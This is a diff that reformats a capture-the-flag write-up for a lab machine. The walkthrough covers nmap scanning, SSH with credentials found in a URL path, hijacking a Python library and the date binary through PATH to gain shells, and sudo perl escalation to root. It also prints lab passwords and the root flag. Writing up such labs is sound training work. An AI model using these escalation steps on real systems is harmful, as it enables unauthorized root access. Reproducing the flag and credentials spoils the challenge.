@@ -1,5 +1,7 @@
-Toss a coin
+# Toss a coin
 
+## Enumeration
+```bash
 └─$ nmap  -sV -A -p- -sC  10.10.155.232
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 10:42 BST
 Nmap scan report for 10.10.155.232
@@ -42,19 +44,29 @@ Progress: 99609 / 566836 (17.57%)
 ===============================================================
 Finished
 ===============================================================
+```
 
-after a long time i got this : http://10.10.155.232/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/
-
+### After a long time i got this : http://10.10.155.232/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/
+```bash
 ssh jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
+```
+## Exploitation
 
+## Privilege Escalation
+### I found a script using random python library so I hijack it
+```bash
 touch random.py
 
 import os
 os.system("bash")
 
 sudo -u yen /usr/bin/python3.6 /home/jaskier/toss-a-coin.py
+```
+## User FLAG
+I forgot to write it
 
-└─$ strings portal           
+```bash
+└─$ strings portal
 /lib64/ld-linux-x86-64.so.2
 libc.so.6
 setuid
@@ -137,22 +149,26 @@ __cxa_finalize@@GLIBC_2.2.5
 .data
 .bss
 .comment
+```
+### Binary hijack on date binary
 
-binary hijacking sur date
-
+```bash
 vim date
 #!/bin/bash
 /bin/bash
 
 chmod +x date
-export PATH=.
+export PATH=.:$PATH
 
 ./portal
+```
+### I got a shell as geralt
 
+```bash
 cd /home/geralt
-
-cat password.txt : IH4teP0rt4ls
-
+```
+```cat password.txt``` : IH4teP0rt4ls
+```bash
 sudo -l 
 
 [sudo] password for geralt: 
@@ -161,13 +177,14 @@ Matching Defaults entries for geralt on the-continent:
 
 User geralt may run the following commands on the-continent:
     (root) /usr/bin/perl
-    
+```
 
+```bash
 sudo perl -e 'exec "/bin/sh";'
+```
 
-whoami = root
-
-cat /root/root.txt : EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}
+## Root FLAG
+```cat /root/root.txt``` : EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}
 
 
 
